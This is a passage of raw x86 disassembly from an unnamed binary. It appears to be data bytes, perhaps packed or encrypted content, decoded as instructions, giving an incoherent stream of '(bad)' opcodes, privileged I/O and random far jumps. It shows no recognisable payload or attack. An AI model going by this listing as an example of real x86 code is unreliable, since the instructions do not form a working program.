  417fa2:	add    bl,BYTE PTR [eax]
  417fa4:	sbb    BYTE PTR [edx],bh
  417fa6:	adc    BYTE PTR [esi+0x21],ch
  417fa9:	adc    DWORD PTR [ebx],esp
  417fab:	sbb    al,0xa8
  417fad:	ret    
  417fae:	in     eax,dx
  417faf:	jecxz  0x418025
  417fb1:	mov    es,esi
  417fb3:	dec    ebp
  417fb4:	dec    esi
  417fb5:	(bad)  
  417fb6:	or     DWORD PTR [ecx+0x5eaa1fa2],ebp
  417fbc:	push   0xffffffb8
  417fbe:	and    BYTE PTR [edx-0x35],cl
  417fc1:	xchg   DWORD PTR [ebp-0x7d24154a],edi
  417fc7:	mov    cl,bh
  417fc9:	into   
  417fca:	push   edi
  417fcb:	fcomi  st,st(7)
  417fcd:	rcl    bl,0xef
  417fd0:	pushf  
  417fd1:	fisubr WORD PTR [eax+ecx*2+0x6c]
  417fd5:	jne    0x417fe7
  417fd7:	enter  0xad79,0x58
  417fdb:	push   ss
  417fdc:	jg     0x417f7c
  417fde:	dec    esp
  417fdf:	icebp  
  417fe0:	sbb    DWORD PTR [edx],ecx
  417fe2:	lods   eax,DWORD PTR ds:[esi]
  417fe3:	adc    al,0xbf
  417fe5:	(bad)
  417fe8:	imul   esp,esi,0x42
  417feb:	pushf  
  417fec:	shl    BYTE PTR [ebx-0x684435cb],cl
  417ff2:	int    0xa8
  417ff4:	inc    esp
  417ff5:	mov    al,ds:0x89386c38
  417ffa:	xchg   edi,eax
  417ffb:	xchg   DWORD PTR [edx-0x39e708fa],esp
  418001:	xor    edi,DWORD PTR [eax+edx*2]
  418004:	xlat   BYTE PTR ds:[ebx]
  418005:	add    BYTE PTR [eax-0x30],al
  418008:	inc    esp
  418009:	sub    DWORD PTR [esi-0x4b3f5e45],edx
  41800f:	(bad)  
  418010:	fdiv   QWORD PTR [edx]
  418012:	adc    al,0xbb
  418014:	in     al,dx
  418015:	lock sub eax,0xac430261
  41801b:	outs   dx,BYTE PTR ds:[esi]
  41801c:	sub    al,0xe3
  41801e:	clc    
  41801f:	mov    ds:0xfc36d080,eax
  418024:	cli    
  418025:	mov    ebp,0xee92ea33
  41802a:	sbb    al,0xca
  41802c:	out    dx,al
  41802d:	outs   dx,BYTE PTR ds:[esi]
  41802e:	out    0xa1,al
  418030:	dec    edi
  418031:	adc    DWORD PTR [ebp+eax*4-0x15],eax
  418035:	int3   
  418036:	pop    ebp
  418037:	xchg   ebp,eax
  418038:	add    al,0xe
  41803a:	imul   esp,edx,0xffffffe1
  41803d:	adc    BYTE PTR [ebp+0x67],bh
  418040:	(bad)  
  418042:	inc    edi
  418043:	pop    ebp
  418044:	push   0x4b
  418046:	cmp    eax,0xe337f421
  41804b:	outs   dx,BYTE PTR ds:[esi]
  41804c:	frstor [ebx-0x5c]
  41804f:	retf   0xd740
  418052:	fwait
  418053:	xchg   esi,eax
  418054:	mov    ebp,0xba9040c9
  418059:	dec    ecx
  41805a:	adc    BYTE PTR [edi+0x76],bh
  41805d:	clc    
  41805e:	ret    
  41805f:	fldlg2 
  418061:	inc    ebp
  418062:	jo     0x41803e
  418064:	aas    
  418065:	xchg   edx,eax
  418066:	ja     0x4180a9
  418068:	ror    DWORD PTR [eax-0x6d],1
  41806b:	mov    dl,0xbe
  41806d:	hlt    
  41806e:	fnsave [eax+0x9]
  418071:	rol    DWORD PTR [eax+0xe],0xd
  418075:	cmp    esi,0x42
  418078:	inc    ebx
  418079:	dec    edi
  41807a:	mov    gs,WORD PTR [edx-0x52b80e01]
  418080:	out    dx,eax
  418081:	test   BYTE PTR [eax],0xf8
  418084:	cdq    
  418085:	mov    eax,0xdf5e003f
  41808a:	sbb    BYTE PTR [edx],cl
  41808c:	mov    eax,ds:0x2acdc2a6
  418091:	(bad)  
  418092:	aam    0xa3
  418094:	fwait
  418095:	inc    ebx
  418096:	ins    DWORD PTR es:[edi],dx
  418097:	lods   eax,DWORD PTR ds:[esi]
  418098:	push   0x50e2ece2
  41809d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41809e:	sub    BYTE PTR [edx],cl
  4180a0:	pop    es
  4180a1:	das    
  4180a2:	add    eax,0xdebac5f0
  4180a7:	fiadd  WORD PTR [edi+0x6aebc9ef]
  4180ad:	popa   
  4180ae:	push   cs
  4180af:	daa    
  4180b0:	inc    esi
  4180b1:	jnp    0x41809b
  4180b3:	sbb    esi,ecx
  4180b5:	sbb    DWORD PTR [ecx],0xdff9267a
  4180bb:	mov    esp,0x829de4da
  4180c0:	fcmovbe st,st(3)
  4180c2:	mov    dl,0x8f
  4180c4:	mov    ecx,0xcc534a7
  4180c9:	popf   
  4180ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180cb:	add    BYTE PTR [eax-0x1d366a5b],bl
  4180d1:	lods   al,BYTE PTR ds:[esi]
  4180d2:	or     eax,DWORD PTR [ecx-0x617a7e23]
  4180d8:	call   0xdf7bf1e4
  4180dd:	shl    BYTE PTR [ecx+0x7a],cl
  4180e0:	sub    eax,0x10d8f64e
  4180e5:	stc    
  4180e6:	in     ax,0xcb
  4180e9:	orps   xmm6,XMMWORD PTR [ebp+0x6183e5d]
  4180f0:	(bad)  
  4180f1:	(bad)  
  4180f2:	es dec esi
  4180f4:	lea    ecx,[edi+0x19c0f780]
  4180fa:	jb     0x41816e
  4180fc:	pop    edx
  4180fd:	in     eax,0xe8
  4180ff:	sti    
  418100:	add    eax,0xd5f4c553
  418105:	push   0xffffffe6
  418107:	adc    ebp,0x661fd0b9
  41810d:	sbb    ch,BYTE PTR [eax+0x43]
  418110:	imul   ecx,DWORD PTR ds:0xa64b576f,0x40
  418117:	jp     0x4180eb
  418119:	inc    DWORD PTR [esi+0x1b21f980]
  41811f:	iret   
  418120:	stc    
  418121:	mov    ah,0x9e
  418123:	xchg   esi,eax
  418124:	xor    al,0xd0
  418126:	repz shl BYTE PTR [edi],0x4d
  41812a:	repz je 0x4181a5
  41812d:	test   ecx,edi
  41812f:	jmp    0xed77:0x1c5399bd
  418136:	sbb    al,0x29
  418138:	leave  
  418139:	lods   al,BYTE PTR ds:[esi]
  41813a:	mov    ch,0x31
  41813c:	push   ecx
  41813d:	call   FWORD PTR [edx]
  41813f:	ficom  DWORD PTR [esi+0x17]
  418142:	mov    esi,0xf9eda1fb
  418147:	mov    ah,0xf0
  418149:	stc    
  41814a:	icebp  
  41814b:	jmp    0xe8fa02d
  418150:	ins    DWORD PTR es:[edi],dx
  418151:	fcmovu st,st(6)
  418153:	aas    
  418154:	js     0x4181a3
  418156:	jae    0x4181a7
  418158:	int3   
  418159:	mov    eax,ds:0x3fbb573a
  41815e:	ins    DWORD PTR es:[edi],dx
  41815f:	sub    eax,0x72adf669
  418164:	cmp    bh,bl
  418166:	push   0x9d379985
  41816b:	in     eax,dx
  41816c:	add    al,0xad
  41816e:	sub    al,BYTE PTR [edi]
  418170:	ret    
  418171:	push   ecx
  418172:	dec    ebp
  418173:	adc    bl,BYTE PTR [edx]
  418175:	push   cs
  418176:	mov    ch,0x51
  418178:	ret    0xd2c8
  41817b:	or     eax,0x834d7ad2
  418180:	inc    ebp
  418181:	lea    edi,ds:0xec33922f
  418187:	repz retf 0x2ed7
  41818b:	fld    TBYTE PTR [ecx+0x7e]
  41818e:	dec    edi
  41818f:	popa   
  418190:	pop    ds
  418191:	jmp    0x4cd8:0xaa01f0c4
  418198:	push   0x71
  41819a:	add    eax,0x2be22688
  41819f:	frstor [eax+0x6a]
  4181a2:	stos   BYTE PTR es:[edi],al
  4181a3:	xor    al,0x14
  4181a5:	xchg   edi,eax
  4181a6:	cmp    BYTE PTR [esi-0x446af4d6],ch
  4181ac:	sub    ecx,DWORD PTR [eax-0x270039d3]
  4181b2:	nop
  4181b3:	mov    ecx,0xbbcd1a0f
  4181b8:	inc    ebp
  4181b9:	adc    DWORD PTR [esi+0x2c7b5de9],edx
  4181bf:	inc    eax
  4181c0:	pusha  
  4181c1:	call   0xf3ae:0xc0d62e76
  4181c8:	or     esp,DWORD PTR [ebx+0x2c]
  4181cb:	int3   
  4181cc:	(bad)  
  4181cd:	jae    0x418220
  4181cf:	dec    ebx
  4181d0:	jle    0x4181d3
  4181d2:	sbb    BYTE PTR [eax-0x78ba13ea],bl
  4181d8:	inc    eax
  4181d9:	or     al,0x66
  4181db:	pusha  
  4181dc:	mov    es,edx
  4181de:	xchg   esp,eax
  4181df:	out    0x8d,eax
  4181e1:	shl    DWORD PTR [edi+ecx*1],0xd8
  4181e5:	(bad)  
  4181e6:	mov    al,ds:0xea7f19b5
  4181eb:	and    BYTE PTR [ebp+edx*4-0x6a0afd97],bh
  4181f2:	clc    
  4181f3:	aas    
  4181f4:	lods   al,BYTE PTR ds:[esi]
  4181f5:	into   
  4181f6:	std    
  4181f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f8:	sbb    al,0x2d
  4181fa:	daa    
  4181fb:	pop    eax
  4181fc:	and    DWORD PTR [edi],edi
  4181fe:	imul   edi,DWORD PTR [edx+ecx*4-0xa120584],0x12
  418206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418207:	cli    
  418208:	(bad)  
  418209:	xor    dl,cl
  41820b:	dec    esi
  41820c:	xchg   esp,eax
  41820d:	std    
  41820e:	ja     0x4181d1
  418210:	mov    ah,0xdd
  418212:	cmp    al,0xe2
  418214:	fstp   QWORD PTR [edi]
  418216:	adc    al,0x5b
  418218:	sbb    ebp,DWORD PTR [edi]
  41821a:	sub    DWORD PTR [ebx],0xffffff82
  41821d:	mov    bh,0x78
  41821f:	cmc    
  418220:	pop    ebx
  418221:	pop    es
  418222:	cdq    
  418223:	lods   eax,DWORD PTR ds:[esi]
  418224:	hlt    
  418225:	add    ch,bh
  418227:	mov    dl,0x44
  418229:	push   0x4ccae853
  41822e:	call   0x8c9f:0xfdfcf8cd
  418235:	add    dl,ah
  418237:	std    
  418238:	fwait
  418239:	cli    
  41823a:	mov    al,0x3f
  41823c:	loope  0x41827e
  41823e:	pop    esp
  41823f:	jb     0x4181c7
  418241:	push   esi
  418242:	cmp    BYTE PTR [eax],bl
  418244:	dec    ebx
  418245:	icebp  
  418246:	ins    DWORD PTR es:[edi],dx
  418247:	xor    al,0x67
  418249:	es mov edx,0xf1cc0840
  41824f:	push   es
  418250:	mov    edx,0x830d571a
  418255:	inc    esi
  418256:	xchg   ebp,eax
  418257:	dec    eax
  418258:	aas    
  418259:	aad    0x65
  41825b:	(bad)  [ebp-0x58]
  41825e:	test   DWORD PTR [edx+edi*4+0x6a],ebx
  418262:	jno    0x41824d
  418264:	js     0x4182c2
  418266:	push   edi
  418267:	imul   BYTE PTR [ecx-0x5d]
  41826a:	mov    ah,0xdb
  41826c:	fldenv [ebx+0x6b]
  41826f:	sbb    edx,0x95ebfad2
  418275:	or     DWORD PTR [esi],ecx
  418277:	xchg   edi,eax
  418278:	cwde   
  418279:	ret    
  41827a:	sub    ecx,DWORD PTR [edx+eax*1-0x50d9bc08]
  418281:	and    al,0x13
  418283:	lock retf 
  418285:	fisttp DWORD PTR [edx+0x154b4681]
  41828b:	jmp    DWORD PTR [ebx+0x6aec63a1]
  418291:	cmp    al,0x60
  418293:	cwde   
  418294:	and    al,0xf8
  418296:	cmp    DWORD PTR [esp+eax*1-0x26],eax
  41829a:	pop    ss
  41829b:	je     0x418263
  41829d:	jmp    0x8cefd7be
  4182a2:	sbb    BYTE PTR [eax+0x3f],bl
  4182a5:	jo     0x4182f8
  4182a7:	int    0x23
  4182a9:	cmp    eax,0x4741b86a
  4182ae:	pushf  
  4182af:	lds    esp,FWORD PTR [esp+ebp*8]
  4182b2:	and    al,0xd4
  4182b4:	es ja  0x418252
  4182b7:	ins    BYTE PTR es:[edi],dx
  4182b8:	mov    ebp,0x602938e5
  4182bd:	xchg   esp,eax
  4182be:	inc    BYTE PTR ds:0xc47150be
  4182c4:	push   esp
  4182c5:	jg     0x41825a
  4182c7:	fwait
  4182c8:	sti    
  4182c9:	mov    ebx,0x50240425
  4182ce:	mov    cl,0x52
  4182d0:	enter  0x53e8,0x87
  4182d4:	data16 mov dh,0xd7
  4182d7:	into   
  4182d8:	dec    esi
  4182d9:	ss ds mov eax,0x8eb7ff1
  4182e0:	xor    ecx,esp
  4182e2:	xor    BYTE PTR [eax+0xa1d9822],cl
  4182e8:	push   0xcf6504c1
  4182ed:	mov    ebx,0x798337d1
  4182f2:	add    DWORD PTR [edx+0x1d6fa2c4],esp
  4182f8:	jns    0x4182e1
  4182fa:	cmp    bh,BYTE PTR [ecx-0x5a]
  4182fd:	fldcw  WORD PTR [edi+edi*1]
  418300:	or     edx,esi
  418302:	scas   eax,DWORD PTR es:[edi]
  418303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418304:	popa   
  418305:	sub    DWORD PTR [edi+ebx*4],eax
  418308:	rol    BYTE PTR [edx+ebx*4+0x1fd2d500],0xa6
  418310:	xchg   ebp,eax
  418311:	pop    edx
  418312:	sahf   
  418313:	dec    ebp
  418314:	cmp    esp,ebp
  418316:	or     al,0x5
  418318:	lock mov edx,DWORD PTR [ecx+0x17]
  41831c:	xchg   ebp,eax
  41831d:	fucompp 
  41831f:	repz sub DWORD PTR [bx+si-0x58],ebp
  418324:	mov    esp,0x45e4b686
  418329:	test   al,0x5f
  41832b:	ins    DWORD PTR es:[edi],dx
  41832c:	xor    dh,BYTE PTR [esp+edi*8+0x33]
  418330:	push   0x18326bb7
  418335:	leave  
  418336:	dec    edx
  418337:	push   esi
  418338:	shl    BYTE PTR [esp+edx*8+0x6a],0xed
  41833d:	push   ss
  41833e:	clc    
  41833f:	jp     0x4182c4
  418341:	test   al,0xc3
  418343:	arpl   WORD PTR [esp+ecx*2+0x1f],dx
  418347:	or     ah,0xf6
  41834a:	mov    ds:0x82615191,al
  41834f:	sbb    eax,0x6cdaec24
  418354:	cmp    esi,DWORD PTR [ebx+0x5a85511a]
  41835a:	addr16 mov bl,0xc3
  41835d:	loop   0x41837d
  41835f:	push   cs
  418360:	jmp    0x41839e
  418362:	jmp    0xb612:0x6396eb62
  418369:	ds inc ebx
  41836b:	rcl    DWORD PTR [esi+ecx*4-0x63f4739],0x79
  418373:	pop    esp
  418374:	cli    
  418375:	outs   dx,BYTE PTR ds:[esi]
  418376:	cmp    eax,0xb89e3faf
  41837b:	sub    eax,0x3b49a6c1
  418380:	adc    ah,BYTE PTR [eax-0x62]
  418383:	clc    
  418384:	test   BYTE PTR [edi-0x3f422b45],al
  41838a:	inc    edx
  41838b:	aaa    
  41838c:	enter  0x936b,0xfe
  418390:	push   ecx
  418391:	test   al,0x30
  418393:	and    eax,0xd4afc5fb
  418398:	add    ecx,DWORD PTR [esi]
  41839a:	sub    edx,DWORD PTR [eax+eax*4-0x63]
  41839e:	add    al,0xf5
  4183a0:	(bad)  
  4183a1:	scas   eax,DWORD PTR es:[edi]
  4183a2:	ss jns 0x41841f
  4183a5:	call   0xf0ee:0x635a3d73
  4183ac:	jno    0x4183b7
  4183ae:	dec    ebp
  4183af:	sub    eax,0x46936b94
  4183b4:	jmp    0xd4352417
  4183b9:	imul   cl
  4183bb:	pop    ds
  4183bc:	into   
  4183bd:	and    al,0x9d
  4183bf:	ja     0x418430
  4183c1:	inc    eax
  4183c2:	hlt    
  4183c3:	dec    ebp
  4183c4:	or     BYTE PTR [ecx+0x5c663d1],dl
  4183ca:	jbe    0x41843a
  4183cc:	fistp  DWORD PTR [ecx+0x21]
  4183cf:	(bad)
  4183d2:	jo     0x41844e
  4183d4:	daa    
  4183d5:	jne    0x4183b0
  4183d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d8:	das    
  4183d9:	push   0xfe4d5fe4
  4183de:	mov    bl,0xac
  4183e0:	push   esp
  4183e1:	int    0x21
  4183e3:	ror    DWORD PTR [ebp-0xd],cl
  4183e6:	lods   eax,DWORD PTR ds:[esi]
  4183e7:	or     al,0x6e
  4183e9:	jmp    0x12e4:0x7066c1f8
  4183f0:	inc    ebx
  4183f1:	fld    TBYTE PTR [edi+0xf]
  4183f4:	or     al,0x94
  4183f6:	dec    edx
  4183f7:	adc    DWORD PTR [ecx-0x44],eax
  4183fa:	pop    edi
  4183fb:	mov    esp,0xab695939
  418400:	mov    esp,0xf8db5fb2
  418405:	adc    eax,0xcca1e546
  41840a:	push   cs
  41840b:	cmp    DWORD PTR [esi],ebp
  41840d:	cmp    edx,ecx
  41840f:	es (bad) 
  418411:	jae    0x41841e
  418413:	dec    esi
  418414:	pusha  
  418415:	inc    esi
  418416:	mov    ah,0xbe
  418418:	sti    
  418419:	dec    eax
  41841a:	lea    esp,[eax]
  41841c:	into   
  41841d:	shl    DWORD PTR [eax],cl
  41841f:	adc    BYTE PTR [ecx+0x4c88df39],dh
  418425:	pop    ebx
  418426:	add    DWORD PTR [ebx+0x6d],0xdae6bfa2
  41842d:	ret    
  41842e:	push   ebx
  41842f:	pop    esi
  418430:	pop    ebp
  418431:	aas    
  418432:	pop    ecx
  418433:	jo     0x41849a
  418435:	mov    ebp,DWORD PTR [edx+eax*4]
  418438:	retf   0x9ba5
  41843b:	out    0x49,al
  41843d:	leave  
  41843e:	dec    edx
  41843f:	dec    ebp
  418440:	out    dx,al
  418441:	adc    al,0xd2
  418443:	adc    edi,edx
  418445:	ja     0x418494
  418447:	into   
  418448:	mov    edx,0xfeeaf8f3
  41844d:	outs   dx,DWORD PTR ds:[esi]
  41844e:	std    
  41844f:	jae    0x4184a8
  418451:	out    0xe3,eax
  418453:	out    dx,eax
  418454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418455:	add    DWORD PTR [esi+0x51ee10a1],ebp
  41845b:	repz inc edx
  41845d:	fstp   QWORD PTR [esi-0x74ed0f13]
  418463:	ss repnz push edi
  418466:	xchg   edx,eax
  418467:	jecxz  0x4184c0
  418469:	lods   al,BYTE PTR ds:[esi]
  41846a:	dec    edx
  41846b:	enter  0xc327,0xdd
  41846f:	ins    DWORD PTR es:[edi],dx
  418470:	(bad)  
  418471:	lds    eax,FWORD PTR [eax-0x1f69fbad]
  418477:	push   ss
  418478:	mov    al,0xaf
  41847a:	jae    0x41845f
  41847c:	adc    eax,ecx
  41847e:	add    BYTE PTR [ebx],dl
  418480:	inc    eax
  418481:	sbb    BYTE PTR [ebp-0x79],al
  418484:	and    DWORD PTR [esi-0x3602e2c3],edi
  41848a:	dec    ecx
  41848b:	push   edx
  41848c:	mov    ah,0xfc
  41848e:	data16 js 0x4184c3
  418491:	jecxz  0x418444
  418493:	stos   DWORD PTR es:[edi],eax
  418494:	xor    DWORD PTR [edx],edx
  418496:	mov    ds:0x59a050db,eax
  41849b:	nop    DWORD PTR [ebx]
  41849e:	je     0x418438
  4184a0:	jge    0x418516
  4184a2:	push   es
  4184a3:	fs mov ecx,0x66d01260
  4184a9:	xor    eax,0x464fe277
  4184ae:	mov    ds:0x55e713a2,al
  4184b3:	fdiv   st(6),st
  4184b5:	push   ebx
  4184b6:	sbb    DWORD PTR [ecx+esi*4+0x53e43350],esp
  4184bd:	mov    al,0x81
  4184bf:	in     eax,0x3e
  4184c1:	hlt    
  4184c2:	out    0xd,eax
  4184c4:	xchg   ebx,eax
  4184c5:	add    ch,0xd8
  4184c8:	and    BYTE PTR [ecx+edx*1],al
  4184cb:	sub    eax,0xffffffd1
  4184ce:	pop    ds
  4184cf:	(bad)  
  4184d0:	mov    al,ds:0x668b09cf
  4184d5:	rol    BYTE PTR [ebx-0x79],1
  4184d8:	mov    bl,0x4d
  4184da:	scas   eax,DWORD PTR es:[edi]
  4184db:	add    bh,ch
  4184dd:	inc    eax
  4184de:	inc    esp
  4184df:	scas   al,BYTE PTR es:[edi]
  4184e0:	push   ebx
  4184e1:	cli    
  4184e2:	inc    ebp
  4184e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e4:	clc    
  4184e5:	test   BYTE PTR [eax+0x53],0xef
  4184e9:	adc    al,0xa4
  4184eb:	mov    dl,0xba
  4184ed:	pop    ss
  4184ee:	enter  0x8925,0xf3
  4184f2:	aad    0xb8
  4184f4:	stos   DWORD PTR es:[edi],eax
  4184f5:	adc    al,0xf1
  4184f7:	and    esi,DWORD PTR [eax+0x4cae05f6]
  4184fd:	and    al,0x6b
  4184ff:	sbb    DWORD PTR [ecx-0x7b],eax
  418502:	adc    BYTE PTR [ecx],ch
  418504:	cld    
  418505:	pop    esi
  418506:	push   esp
  418507:	inc    dh
  418509:	mov    eax,ds:0xc1fa013c
  41850e:	or     esp,edx
  418510:	stc    
  418511:	(bad)  
  418512:	dec    edi
  418513:	jmp    0x4184f8
  418515:	pop    ss
  418516:	repz lahf 
  418518:	xor    DWORD PTR [ecx],0x78
  41851b:	loopne 0x4184e0
  41851d:	xor    BYTE PTR fs:[ebp+0x587c28d3],0x25
  418525:	scas   eax,DWORD PTR es:[edi]
  418526:	or     al,0x74
  418528:	outs   dx,BYTE PTR ds:[esi]
  418529:	data16 into 
  41852b:	aam    0x19
  41852d:	cdq    
  41852e:	push   eax
  41852f:	packsswb mm1,QWORD PTR [ebx+0x5c]
  418533:	adc    cl,BYTE PTR [ebp+0x4fb6a4d]
  418539:	sbb    bl,0x12
  41853c:	in     eax,0xab
  41853e:	or     BYTE PTR [ebp+0x74b09178],dl
  418544:	adc    eax,0x69b9b97b
  418549:	adc    eax,0x30723da1
  41854e:	cli    
  41854f:	pop    esp
  418550:	ss (bad) 
  418553:	push   edx
  418554:	out    0x95,al
  418556:	xlat   BYTE PTR ds:[ebx]
  418557:	test   eax,0x7a011e58
  41855c:	jne    0x4185ac
  41855e:	xchg   esp,eax
  41855f:	cld    
  418560:	jns    0x41858a
  418562:	imul   edi,DWORD PTR [eax+0x48fc5be2],0xff4d1860
  41856c:	repz mov ah,dl
  41856f:	cmp    eax,0xf21d354d
  418574:	jg     0x4184fe
  418576:	push   eax
  418577:	inc    esi
  418578:	jnp    0x4185cd
  41857a:	ret    
  41857b:	mov    dh,0x62
  41857d:	mov    ah,0x6f
  41857f:	outs   dx,DWORD PTR ds:[esi]
  418580:	sub    dh,ah
  418582:	adc    BYTE PTR [ebp+0x4a],0x62
  418586:	inc    ecx
  418587:	(bad)  
  418588:	repz int3 
  41858a:	mov    al,0xb9
  41858c:	call   FWORD PTR [ebp-0xe]
  41858f:	stos   DWORD PTR es:[edi],eax
  418590:	pop    esi
  418591:	lock shr DWORD PTR [ebx+0x14809cee],0x80
  418599:	mov    ds:0xd0dd985f,eax
  41859e:	cs stc 
  4185a0:	loope  0x4185d4
  4185a2:	pop    ds
  4185a3:	fidivr DWORD PTR [esi+0x39]
  4185a6:	ss dec ecx
  4185a8:	sbb    DWORD PTR [esp+ebp*8+0x4d],esp
  4185ac:	xchg   DWORD PTR ss:[ebx-0x1c033fed],edx
  4185b3:	dec    esp
  4185b4:	outs   dx,DWORD PTR ds:[esi]
  4185b5:	jmp    0xe14a35ec
  4185ba:	dec    edx
  4185bb:	ret    
  4185bc:	cmp    DWORD PTR ds:0x62f9fc29,edi
  4185c2:	sub    al,0xc7
  4185c4:	pop    edx
  4185c5:	jmp    0x41855f
  4185c7:	jne    0x4185a8
  4185c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ca:	or     eax,0x797a4a8d
  4185cf:	repz addr16 sahf 
  4185d2:	call   0xda1d:0x2985341e
  4185d9:	aas    
  4185da:	cld    
  4185db:	add    DWORD PTR [eax+0x557df31],ebx
  4185e1:	push   0x3986bade
  4185e6:	jae    0x4185a8
  4185e8:	pop    esi
  4185e9:	push   ds
  4185ea:	mov    esi,0x16346be9
  4185ef:	pusha  
  4185f0:	cmp    eax,DWORD PTR [ebx]
  4185f2:	je     0x41857e
  4185f4:	pop    edx
  4185f5:	outs   dx,DWORD PTR ds:[esi]
  4185f6:	inc    edi
  4185f7:	scas   al,BYTE PTR es:[edi]
  4185f8:	xchg   esp,eax
  4185f9:	sbb    edi,DWORD PTR [ebx+0x135f6493]
  4185ff:	pushf  
  418600:	scas   al,BYTE PTR es:[edi]
  418601:	add    eax,0xd55eeb40
  418606:	fist   DWORD PTR [esi+0x4e]
  418609:	sahf   
  41860a:	pop    esi
  41860b:	dec    esp
  41860c:	js     0x418682
  41860e:	mov    WORD PTR [ebp+0x1447f8a0],ss
  418614:	fld    DWORD PTR [ebp-0xa338b58]
  41861a:	(bad)  [edx+0x6ea26ca7]
  418620:	div    BYTE PTR ds:[ecx]
  418623:	jo     0x4185de
  418625:	mov    dh,0x3d
  418627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418628:	in     al,0x11
  41862a:	mov    ds:0xa44c2f5,eax
  41862f:	retf   0x7f76
  418632:	pop    es
  418633:	sub    esp,eax
  418635:	mov    esp,0xdd784b49
  41863a:	in     al,0xd7
  41863c:	dec    ebx
  41863d:	mov    al,dh
  41863f:	fucomp st(6)
  418641:	pop    ecx
  418642:	in     eax,dx
  418643:	ror    BYTE PTR [esp+esi*1],cl
  418646:	mov    eax,gs:0xb44f91cc
  41864c:	xchg   esp,eax
  41864d:	push   ds
  41864e:	xchg   esp,eax
  41864f:	dec    eax
  418650:	jecxz  0x41868c
  418652:	mov    esi,DWORD PTR [edx]
  418654:	dec    eax
  418655:	in     al,0x17
  418657:	imul   ebx,DWORD PTR [ebx+0x22],0x368a90e2
  41865e:	outs   dx,DWORD PTR ds:[esi]
  41865f:	push   ebp
  418660:	jno    0x4186c8
  418662:	adc    DWORD PTR [si+0xec5],edi
  418667:	mov    dl,0x58
  418669:	inc    ecx
  41866a:	fild   DWORD PTR [edx]
  41866c:	xor    al,0x5a
  41866e:	and    dl,BYTE PTR [ebp+0x1061568e]
  418674:	push   ss
  418675:	dec    ecx
  418676:	cli    
  418677:	pop    esi
  418678:	popf   
  418679:	jmp    0xbeec5f06
  41867e:	pop    es
  41867f:	sbb    al,0x47
  418681:	adc    DWORD PTR [esi+0x40],esp
  418684:	xchg   DWORD PTR [ebp+eiz*1+0x2aa81673],edi
  41868b:	add    eax,0x63bd1af8
  418690:	pop    esi
  418691:	(bad)  
  418692:	sbb    al,0x78
  418694:	pop    ds
  418695:	outs   dx,BYTE PTR ds:[esi]
  418696:	adc    DWORD PTR [edi+0x66],ebp
  418699:	ja     0x418678
  41869b:	mov    BYTE PTR [edi+0x3d7cf372],ch
  4186a1:	inc    eax
  4186a2:	inc    ebx
  4186a3:	fst    DWORD PTR [edx+edi*2]
  4186a6:	push   eax
  4186a7:	(bad)  
  4186a8:	mov    cl,0x50
  4186aa:	adc    eax,0xd821631
  4186af:	sti    
  4186b0:	mov    ebx,0xe33da853
  4186b5:	stos   BYTE PTR es:[edi],al
  4186b6:	and    eax,0x6cbd9aae
  4186bb:	cmp    al,0x96
  4186bd:	inc    esi
  4186be:	imul   edi,edx,0x7c
  4186c1:	inc    ebp
  4186c2:	xchg   edi,eax
  4186c3:	adc    al,0x49
  4186c5:	sar    BYTE PTR [esi],1
  4186c7:	aas    
  4186c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c9:	add    BYTE PTR [ebp-0x33],ah
  4186cc:	inc    esp
  4186cd:	add    ebp,ebx
  4186cf:	hlt    
  4186d0:	bound  edx,QWORD PTR [esi+0x77b55caf]
  4186d6:	fwait
  4186d7:	mov    eax,ds:0x31caf79b
  4186dc:	and    al,0x2a
  4186de:	jnp    0x4186c0
  4186e0:	addr16 test cl,0x28
  4186e4:	fdiv   QWORD PTR [esi-0x2c]
  4186e7:	lods   al,BYTE PTR ds:[esi]
  4186e8:	sub    al,0x2a
  4186ea:	push   ds
  4186eb:	xchg   BYTE PTR [ebp+0x648e574b],cl
  4186f1:	mov    al,0x5b
  4186f3:	test   al,0x56
  4186f5:	fwait
  4186f6:	stos   BYTE PTR es:[edi],al
  4186f7:	fnsave [eax+0x5c94bb34]
  4186fd:	lods   eax,DWORD PTR ds:[esi]
  4186fe:	or     eax,0x9b5e5fda
  418703:	or     ah,BYTE PTR ss:[eax-0x4970ae70]
  41870a:	sub    eax,0x8a891dd
  41870f:	push   esi
  418710:	in     al,dx
  418711:	xchg   esi,eax
  418712:	rcl    DWORD PTR [ebx*2-0x2b9af160],cl
  418719:	push   eax
  41871a:	js     0x41875b
  41871c:	jl     0x4186c5
  41871e:	xor    eax,0x17312102
  418723:	push   ds
  418724:	or     esi,DWORD PTR [ebx+0x51]
  418727:	(bad)  
  418728:	adc    eax,0x2aad28cd
  41872d:	add    ch,al
  41872f:	inc    esi
  418730:	jp     0x4186e8
  418732:	add    al,0xa1
  418734:	in     eax,dx
  418735:	jo     0x4187b6
  418737:	ds fsub st(7),st
  41873a:	add    eax,0x60fc2b7e
  41873f:	hlt    
  418740:	jne    0x4187be
  418742:	in     al,0xe1
  418744:	dec    esp
  418745:	jl     0x418724
  418747:	push   DWORD PTR [eax+eiz*8+0x6a]
  41874b:	jnp    0x418727
  41874d:	in     al,0xdb
  41874f:	mov    WORD PTR [ecx-0x30],cs
  418752:	add    edx,DWORD PTR [edi+ebp*8+0x26]
  418756:	inc    esi
  418757:	arpl   ax,ax
  418759:	add    BYTE PTR [edx+ebp*1-0x387254b7],ah
  418760:	and    edi,DWORD PTR [ebx]
  418762:	into   
  418763:	fld    TBYTE PTR [eax+0x4c5075e6]
  418769:	sahf   
  41876a:	cli    
  41876b:	int    0x8a
  41876d:	sbb    ecx,DWORD PTR [edx]
  41876f:	jbe    0x418745
  418771:	cwde   
  418772:	outs   dx,BYTE PTR ds:[esi]
  418773:	cdq    
  418774:	add    ch,dh
  418776:	arpl   WORD PTR [edx+0x8],bx
  418779:	fdivr  st(0),st
  41877b:	inc    edx
  41877c:	inc    edx
  41877d:	inc    esi
